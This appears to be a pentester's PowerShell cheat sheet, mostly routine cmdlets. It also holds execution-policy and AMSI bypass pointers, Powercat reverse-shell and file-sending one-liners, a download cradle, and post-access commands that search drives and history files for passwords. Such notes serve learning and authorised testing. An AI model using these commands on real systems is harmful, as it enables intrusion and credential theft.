# PowerShell

`powershell -ep bypass` - Start powershell with execution policy bypassed.

`powershell -ep bypass -file myscript.ps1`- Start powershell with execution policy bypassed and run script in file 'myscript.ps1'.

`. .\importmodule.ps1` - Import module from current directory.

## Resources

- [Raikia's Hub, Powershell encoder](https://raikia.com/tool-powershell-encoder/)
- [AMSI.fail](http://amsi.fail/)

## Basic/Other

```
Get-Command [*-*]
(Get-Command *-*).Parameters
Get-Help [cmdlet] [-online | -examples]
Get-Content [textfile]
Get-FileHash -Algorithm md5 [filename]
Get-Location
Test-Path [path]
Get-Clipboard
echo (1..254)
Get-ExecutionPolicy
Set-ExecutionPolicy Unrestricted
```

- https://techcommunity.microsoft.com/t5/itops-talk-blog/powershell-basics-how-to-scan-open-ports-within-a-network/ba-p/924149

## Base64

Encoding:

https://docs.microsoft.com/en-us/previous-versions/troubleshoot/winautomation/process-development-tips/text-manipulation/convert-file-to-base64-string-format

`[convert]::ToBase64String((Get-Content -path "your_file_path" -Encoding byte))`

Decoding:

[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($TEXT))

## Taking care of output

Pipe to `Get-Member` to retrieve properties of command(methods and variables).

To view one of them, use `-MemberType [method | property]`.

Pipe to `Select-Object` to create a new object from output, example:

`Select-Object -Property Name, operatingsystem`
``
Pipe to `Where-Object` to filter output.

`Where-Object -Property [example] -operator [value]`

`Where-Object {$_.[example] -operator [value]}`, $_ iterates through all objects passed to command.

Pipe to `Measure-Object` to count number of lines.

Pipe to `Select` to only view certain properties.

## Operators

https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.1&viewFallbackFrom=powershell-6

-Contains

-EQ

-GT

## Scripting

- https://learnxinyminutes.com/docs/powershell/

```powershell
foreach($var in $oldvar){
  if($var -in $anothervar.property){
    echo $var
  }
}
```

```powershell
for($i=130; $i -le 140; $i++){
  Test-NetConnection localhost -Port $i
}
```
![socket-script](assets/markdown-img-paste-20210917125636272.png)


- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators?view=powershell-7.1&viewFallbackFrom=powershell-6

## Remoting/Sessions

```
# Start a new session to execute on
$sesh = New-PSSession -Computer 'NAME'

# Invoke commands on session
Invoke-Command -Session SESSION -ScriptBlock {COMMANDS}

# Copy files
Copy-Item "LOCAL_PATH" -Destination "PATH" -ToSession SESSION_NAME
```

## Searching

```
# Search for filename that includes string
Get-Childitem -path "C:\Program Files (x86)" -recurse -include "*wserv*" -erroraction silentlycontinue

# Search for exact match filename
Get-ChildItem -path "C:\" -recurse -name [exact_filename]

# Search for file containing string
Get-ChildItem -recurse | Select-String -pattern [string] -erroraction silentlycontinue
```

## Services

```
[Get | Start | Stop | Restart]-Service *servicename*
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-Service | Where-Object -Property Status -eq Running
Get-Service -DisplayName "*keyword*"
Get-Service "s*" | Sort-Object status
get-wmiobject win32_service | ?{$_.Name -like '*schedule*'} | select Name, PathName
```

## Permissions

```
get-acl *HKLM\SYSTEM\CurrentControlSet\services\*
```

## Optional features

```
optionalfeatures.exe
Enable-WindowsOptionalFeature [-Online] -FeatureName "[name]" -all
# Enabling SMB1 client
Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -all
```


## http/download/upload

```
Invoke-WebRequest -Uri '' -OutFile ''
(new-object system.net.webclient).downloadfile(\"[url]\",\"[ouput]\")
```

- [Searching with powershell](https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/)
- [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)

## System.IO

```powershell
[System.IO.File]::Copy('C:\Users\Administrator\thing.txt', '\\192.168.1.1\c$\thing.txt', $True)

[System.IO.Directory]::createDirectory("\\192.168.1.1\c$\mydir")
```

## Basic enumeration

```powershell
get-localuser [-name | -SID]
get-localuser | Select name,PasswordRequired, SID
get-localgroup
get-NetIPAddress | [select ipv4address]
get-NetTCPConnection
get-nettcpconnection | where-object -property state -eq listen | select localport
get-acl [path] | [Select Owner]
get-scheduledtask
```

## PowerView

https://www.google.com/search?client=firefox-b-d&q=powerview

```
Get-NetComputer [-fulldata] | select [name, operatingsystem, logoncount]
Get-NetUser | select [cn, name]
Get-NetGroup [-groupname *V*]
get-netuser | select name,whenchanged
get-netuser | where-object{$_.name -like "SQL Service"}
get-netuser -SPN | where-object{$_.memberof -match "Domain Admins"}
```

## Powercat

- https://github.com/besimorhino/powercat
```powershell
. .\powercat.ps1
powercat -c 192.168.1.1 -p 443 -ep | -e cmd.exe
powercat -l -p 443 -ep | -e cmd.exe
powercat -c 192.168.1.1 -p 443 -i file.txt
# any other command in a script: -g
# base64: -ge
# To execute base64 standalone, copy content and run powershell -E CODE
```

## AV

```powershell
Get-MpPreference #check Disablerealtimemonitoring
```

# PowerShell basic enumeration after getting access.

```
systeminfo
get-localuser
get-localuser [name] | select *
get-localgroup
get-localgroupmember Administrators
get-localgroupmember 'Power Users'
get-localgroupmember
get-netipaddress
get-nettcpconnection
get-service | where-object -property Status -eq Running
get-scheduledtask | where-object -property State -eq Ready
get-Childitem -path "C:\Users" -recurse -name "ConsoleHost_history.txt" -erroraction silentlycontinue
get-Childitem -path "C:\" -recurse -erroraction silentlycontinue | select-string -pattern "password" -erroraction silentlycontinue | out-file s-password.txt # Search path and output path cannot be the same or you'll create an inifinte loop.
get-Childitem -path "C:\" -recurse -erroraction silentlycontinue | select-string -pattern "pass" -erroraction silentlycontinue | out-file s-pass.txt # Search path and output path cannot be the same or you'll create an inifinte loop.
```
